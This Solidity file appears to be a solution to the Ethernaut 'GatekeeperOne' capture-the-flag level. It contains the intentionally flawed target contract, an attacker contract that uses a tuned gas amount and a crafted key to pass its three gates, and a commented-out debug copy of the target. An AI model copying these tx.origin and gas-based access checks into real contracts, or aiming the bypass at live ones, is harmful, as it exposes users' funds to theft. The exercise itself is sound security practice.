// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "hardhat/console.sol";

library SafeMath {
	function mod(uint256 a, uint256 b) internal pure returns (uint256) {
		return a % b;
	}
}

contract GatekeeperOne {
	using SafeMath for uint256;
	address public entrant;

	modifier gateOne() {
		require(msg.sender != tx.origin);
		_;
	}

	modifier gateTwo() {
		require(gasleft().mod(8191) == 0);
		console.log("Passed gate two");
		_;
	}

	modifier gateThree(bytes8 _gateKey) {
		require(
			uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
			"GatekeeperOne: invalid gateThree part one"
		);
		require(
			uint32(uint64(_gateKey)) != uint64(_gateKey),
			"GatekeeperOne: invalid gateThree part two"
		);
		require(
			uint32(uint64(_gateKey)) == uint16(tx.origin),
			"GatekeeperOne: invalid gateThree part three"
		);
		_;
	}

	function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
		entrant = tx.origin;
		return true;
	}
}

contract GatekeeperHack {
	GatekeeperOne gk1;
	uint256 gasSpender = 0;

	constructor(address _gkAddress) public {
		gk1 = GatekeeperOne(_gkAddress);
	}

	function hack(uint256 providedGas, bytes8 key) public {
		(bool success, ) = address(gk1).call{gas: providedGas}(
			abi.encodeWithSignature("enter(bytes8)", key)
		);
		require(success);
	}

	function checkGate3(bytes8 key) external view {
		require(
			uint32(uint64(key)) == uint16(uint64(key)),
			"GatekeeperOne: invalid gateThree part one"
		);
		require(uint32(uint64(key)) != uint64(key), "GatekeeperOne: invalid gateThree part two");
		require(
			uint32(uint64(key)) == uint16(tx.origin),
			"GatekeeperOne: invalid gateThree part three"
		);
	}
}

// contract GatekeeperOne {
// 	//using SafeMath for uint256;
// 	address public entrant;

// 	modifier gateOne() {
// 		//console.log("Gas left 1: %s", gasleft());

// 		require(msg.sender != tx.origin, "Stopped at first gate");
// 		//console.log("Gas left 2: %s", gasleft());

// 		//console.log("Passed first gate");
// 		_;
// 	}

// 	modifier gateTwo() {
// 		// require(gasleft().mod(8191) == 0);
// 		//console.log("Gas left 3: %s", gasleft());
// 		//console.log("Gas left mod 8191: %s", (gasleft() % 8191));
// 		require(gasleft() % 8191 == 0, "Stopped at second gate");
// 		console.log("Passed second gate");
// 		_;
// 	}

// 	modifier gateThree(bytes8 _gateKey) {
// 		require(
// 			uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
// 			"GatekeeperOne: invalid gateThree part one"
// 		);
// 		require(
// 			uint32(uint64(_gateKey)) != uint64(_gateKey),
// 			"GatekeeperOne: invalid gateThree part two"
// 		);
// 		require(
// 			uint32(uint64(_gateKey)) == uint16(tx.origin),
// 			"GatekeeperOne: invalid gateThree part three"
// 		);
// 		_;
// 	}

// 	function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
// 		entrant = tx.origin;
// 		return true;
// 	}
// }
